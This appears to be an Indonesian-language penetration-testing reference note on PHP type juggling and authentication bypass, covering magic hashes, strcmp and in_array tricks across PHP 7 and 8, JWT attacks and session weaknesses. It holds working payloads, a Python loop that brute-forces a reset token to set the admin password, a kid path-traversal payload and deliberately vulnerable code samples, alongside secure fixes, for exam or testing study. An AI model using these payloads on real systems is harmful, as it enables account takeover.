---
name: "PHP Type Juggling & Authentication Bypass"
description: "Loose vs strict comparison, magic hash, strcmp(array) dan in_array longgar dengan gerbang versi PHP 7/8, json_decode, token lemah (mt_rand/java.util.Random), logic flaw reset password, JWT (none, RS256→HS256, kid/jku), dan sesi."
tags: [oswe, php, type-juggling, magic-hash, authentication-bypass, jwt, weak-random, strcmp, session]
---

## PHP Type Juggling & Authentication Bypass

> Gerbang versi menentukan segalanya. PHP 8 mengubah perbandingan string–angka, tetapi **tidak** mengubah bool vs string. Klaim "type juggling selalu jalan" adalah tanda belum cek `php -v`.

### PHP Loose vs Strict Comparison

| Operator | Perilaku |
|---|---|
| `==` | coercion tipe: `"0e123" == "0"` benar (keduanya numeric string) |
| `===` | tipe + nilai harus sama |
| `strcmp($a,$b)` | 0 jika sama; `NULL` bila argumen array (**PHP < 8**) |
| `in_array($a,$b)` | longgar kecuali parameter ketiga `true` |
| `switch($a)` | perbandingan longgar pada `case` |

**PHP 8.0**: `0 == "foo"` → `false`, `0 == ""` → `false`, `42 == "42foo"` → `false`; `"0e1" == "0e2"` tetap `true` (keduanya numeric string). Aturan yang sama berlaku untuk `switch`.

### Magic Hashes

Hash yang seluruhnya `0e` + digit diperlakukan sebagai float `0` pada loose comparison.

```php
md5('240610708')  → 0e462097431906509019562988736854
md5('QNKCDZO')    → 0e830400451993494058024219903391
md5('0e215962017')→ 0e291242476940776845150308577824
sha1('aaroZmOk')  → 0e66507019969427134894567494305185566735
sha1('aaK1STfY')  → 0e76658526655756207688271159624026011393
```

Berlaku bila kedua operand string numeric atau dibandingkan dengan `0`. Mati dengan `===`, `password_verify()`, `hash_equals()`, atau penyimpanan biner.

### strcmp() dengan array

```php
if (strcmp($_POST['password'], $stored_hash) == 0) { }
// PHP 7: strcmp(array, string) → NULL + warning → NULL == 0 → TRUE
// PHP 8: TypeError → 500, bukan bypass
```

Jika error handler mengubah warning menjadi exception, bypass PHP 7 juga mati.

### in_array() longgar

```php
$allowed_roles = ["user", "editor", "admin"];
if (in_array($_POST['role'], $allowed_roles)) { /* grant */ }
```

| Payload | PHP 7 | PHP 8 |
|---|---|---|
| `role=0` | `true` (`"user" == 0`) | `false` |
| `role=true` | `true` | `true` (bool vs string → string jadi bool) |
| `role=0e1` | `true` | `false` |

Uji `role=true` sebelum menyimpulkan versi; kirim `role=0` hanya bila target terbukti PHP 7.

### Type juggling dengan json_decode

```php
$data = json_decode($_POST['data'], true);
if ($data['role'] == 'admin') { /* admin */ }
// {"role": true}  → true == "admin" → "admin" truthy → TRUE (PHP 7 & 8)
// {"role": 1}     → 1 == "admin"   → FALSE (PHP 8); PHP 7 juga false
```

Contoh yang sering beredar — `true == "false"` → `FALSE` — **salah**: PHP membandingkan bool vs string dengan meng-cast string ke bool, sehingga `true == "false"` bernilai `TRUE` ("false" non-kosong). Jangan pakai pola itu sebagai bypass; gunakan `== 'admin'` dengan `{"role":true}`.

### Token lemah

```java
// VULNERABLE — java.util.Random diprediksi dari beberapa output
Random rand = new Random();
String token = String.format("%06d", rand.nextInt(999999));

// SECURE
SecureRandom rand = new SecureRandom();
byte[] tokenBytes = new byte[32]; rand.nextBytes(tokenBytes);
```

```php
// VULNERABLE — mt_rand() dapat di-seed ulang
$token = mt_rand(100000, 999999);
// SECURE
$token = bin2hex(random_bytes(32));
```

`php_mt_seed` membutuhkan seed yang diketahui/ditebak (waktu, `mt_srand`). Satu token tidak cukup untuk `java.util.Random`; butuh beberapa output berurutan. `uniqid()` berbasis microtime; UUID v4 aman, UUID v1 bergantung node.

```python
# Brute 6 digit — hanya masuk akal tanpa rate limit dan tanpa expiry
for i in range(1000000):
    r = requests.post(TARGET + "/reset.php", data={"username": "admin", "token": f"{i:06d}", "new_password": "pwned123"})
    if "success" in r.text:
        print("Token:", f"{i:06d}"); break
```

### Logic flaw reset password

```php
// Langkah 3 tidak memeriksa bahwa langkah 2 sudah selesai
if ($_POST['action'] === 'change_password') {
    $query = "UPDATE users SET password = '$new_password' WHERE username = '$username'";
}
```

Cek di source: flag `verified` disimpan server-side, token terikat user, expiry, dan apakah langkah bisa dilewati.

### JWT

| Serangan | Kondisi | Catatan |
|---|---|---|
| `alg: none` | verifikasi dimatikan / algoritma dari header | butuh signature kosong + trailing dot; library modern menolak |
| RS256 → HS256 | aplikasi memakai public key untuk semua alg | public key harus identik byte; banyak library menolak |
| `kid` | `kid` masuk path/SQL | `../../../../dev/null` + sign kosong, atau SQLi untuk memilih secret |
| `jku`/`x5u` | server mengambil JWKS dari URL | butuh whitelist host yang lemah |
| Secret lemah | HMAC dengan secret pendek | `hashcat -m 16500` |

`alg: none` hanya bekerja bila library/konfigurasi mengizinkannya; jangan berasumsi dari nama parameter.

### Sesi

```php
// ID dapat diprediksi
session_id(md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']));
session_start();
```

Default PHP: `use_strict_mode=0`, `use_only_cookies=1`, `cookie_httponly=0`, `cookie_secure=0`, `cookie_samesite=""`. Session fixation hidup bila tidak ada `session_regenerate_id(true)` setelah login; `use_strict_mode=1` mencegah adopsi ID, bukan fixation setelah login.

### Best Practices

- Cek `php -v`/`composer.lock` sebelum memilih payload; catat versi di bukti.
- Uji `role=true` dan strict comparison sebagai negatif control.
- Jangan klaim bypass dari `strcmp` di PHP 8.
- Simpan request/response mentah dan perubahan state, bukan hanya status 200.
- Bedakan CORS misconfiguration dari CSRF; keduanya punya prasyarat berbeda.

### Rujukan

- php.net: comparison operators, migration80, `in_array`, `strcmp`, `mt_rand`, session configuration.
- PortSwigger: JWT, algorithm confusion, CORS, CSRF.
- Openwall `php_mt_seed`.
- [waf-bypass-payloads.md](./waf-bypass-payloads.md) — bila payload difilter WAF.
